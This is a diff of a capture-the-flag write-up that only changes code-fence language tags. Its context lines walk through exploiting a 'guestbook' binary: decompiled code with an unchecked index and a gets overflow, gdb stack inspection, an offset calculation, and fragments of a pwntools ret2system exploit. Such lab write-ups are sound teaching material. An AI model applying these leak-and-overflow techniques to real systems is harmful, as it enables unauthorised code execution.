@@ -3,7 +3,7 @@
 Noopnoop helped with the creation of this writeup.
 
 Let's take a look at the binary:
-```
+```console
 $    file guestbook
 guestbook: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=bc73592d4897267cd1097b0541dc571d051a7ca0, not stripped
 $    pwn checksec guestbook
@@ -17,7 +17,7 @@ $    pwn checksec guestbook
 
 So we can see that it is 32 bit elf, with a non executable stack and PIE enabled. Let's try running the binary:
 
-```
+```console
 $    ./guestbook
 Please setup your guest book:
 Name for guest: #0
@@ -69,7 +69,7 @@ So it prompts us for four names, then provides us the ability to change or view 
 
 Looking at the main function in Ghidra, we see this:
 
-```
+```c
 
 /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
 
@@ -149,7 +149,7 @@ LAB_000109b3:
 
 Starting off, we can see it allocates four `0xf` byte chunks in the heap, and prompts us to scan in data (the four guest names). It also saves the pointers in the array  `ptrArray`. Proceeding that, we are dropped into a menu where we can either change a name, view a name, or exit. If we choose to view a name, the `readName` function is executed:
 
-```
+```c
 /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
 
 void readName(int ptrArray)
@@ -174,7 +174,7 @@ So we can see that it prompts us for an index to the array of pointers that it i
 
 Looking at the code for editing a guest's name, we see it has the same index bug:
 
-```
+```c
   __isoc99_scanf(&DAT_00010a75,&changeIndex);
     if (changeIndex < 0) {
       puts("Enter a valid number");
@@ -183,7 +183,7 @@ Looking at the code for editing a guest's name, we see it has the same index bug
 
 In addition to that, we can see that there is another bug:
 
-```
+```c
       gets(changeNameInput);
       strcpy(ptrArray[changeIndex],changeNameInput);
 ```
@@ -192,7 +192,7 @@ We can see that there is a call to `gets`, so we have a buffer overflow vulnerab
 
 In addition to that, because PIE is enabled, the address of `system` (which is imported into the program) should change every time. We will need to get the address of `system` in order to execute a return to `system` attack. Also another thing to take note of, it saves the address of `system` in a stack variable (although for some reason, it isn't showing in the disassembly):
 
-```
+```nasm
         00010857 89 45 ec        MOV        dword ptr [EBP + local_18],ptr
         0001085a 8b 83 e8        MOV        ptr,dword ptr [0xffffffe8 + EBX]=>->system       = 00013020
                  ff ff ff
@@ -207,7 +207,7 @@ Our exploit will have two parts. The first is we will use the `readName` functio
 
 Let's take a look at the layout of the memory in gdb:
 
-```
+```c
 gef➤  r
 Starting program: /Hackery/pod/modules/ret_2_system/tu_guestbook/guestbook
 Please setup your guest book:
@@ -303,7 +303,7 @@ The function `puts` will only stop printing until it reaches a null byte. Lookin
 
 So for the buffer overflow, we will use `gets` to overwrite the return address. However we will need to overwrite a pointer that is written to with `strcpy`. Let's take a look at the stack layout:
 
-```
+```text
   char *ptr;
   int iVar1;
   char changeNameInput [100];
@@ -321,7 +321,7 @@ Proceeding that, we need to find the offset from the start of our input in gets 
 
 
 Set a breakpoint for the `strcpy` call:
-```
+```gdb
 gef➤  pie b *0x994
 gef➤  pie run
 Stopped due to shared library event (no libraries added or removed)
@@ -407,7 +407,7 @@ Stack level 0, frame at 0xffffd140:
 ```
 
 and we cans ee that the offset is `0x9c`:
-```
+```pycon
 >>> hex(0xffffd13c - 0xffffd0a0)
 '0x9c'
 ```
@@ -418,7 +418,7 @@ So there we can place the address of `system`. Four bytes after that, we will ju
 
 Putting it all together, we get the following exploit:
 
-```
+```python
 # noopnoop helped with this exploit
 
 # Import pwntools
@@ -484,7 +484,7 @@ target.interactive()
 
 When we run it:
 
-```
+```python
 ➜  /vagrant git:(master) ✗ python exploit.py.2
 [+] Starting local process './guestbook': pid 2717
 [*] running in new terminal: /usr/bin/gdb -q  "./guestbook" 2717 -x "/tmp/pwnDgnK2m.gdb"
